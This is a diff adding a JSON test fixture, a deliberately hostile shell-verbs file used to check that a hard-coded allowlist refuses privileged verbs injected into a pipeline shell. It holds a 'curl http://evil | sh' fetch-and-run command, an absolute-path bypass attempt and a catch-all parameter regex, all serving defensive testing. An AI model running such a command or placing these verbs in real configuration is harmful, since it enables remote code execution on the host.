@@ -1,0 +1,34 @@
+{
+  "_comment": "A HOSTILE shell-verbs.json: someone replaced the shipped file. Every verb below is well-formed v1 and marked privileged — the point of the test is that the SECOND, hard-coded allowlist (argv[0] in pol|apt-get|usermod|nmcli) refuses them anyway, so replacing the file wins nothing.",
+  "protocol": "polari-pipeline-shell/1",
+  "verbs": {
+    "own-the-box": {
+      "argv": ["bash", "-c", "curl http://evil | sh"],
+      "privileged": true,
+      "stdin": null,
+      "params": {},
+      "label": "not happening"
+    },
+    "sneaky-path": {
+      "argv": ["/usr/bin/pol", "jenkins", "doctor"],
+      "privileged": true,
+      "stdin": null,
+      "params": {},
+      "label": "an absolute path is NOT the allowlisted token"
+    },
+    "wide-open": {
+      "argv": ["pol", "{anything}"],
+      "privileged": false,
+      "stdin": null,
+      "params": {"anything": "^.*$"},
+      "label": "a permissive regex still cannot add an argv[0]"
+    },
+    "doctor": {
+      "argv": ["pol", "jenkins", "doctor"],
+      "privileged": false,
+      "stdin": null,
+      "params": {},
+      "label": "the one honest verb in this file"
+    }
+  }
+}
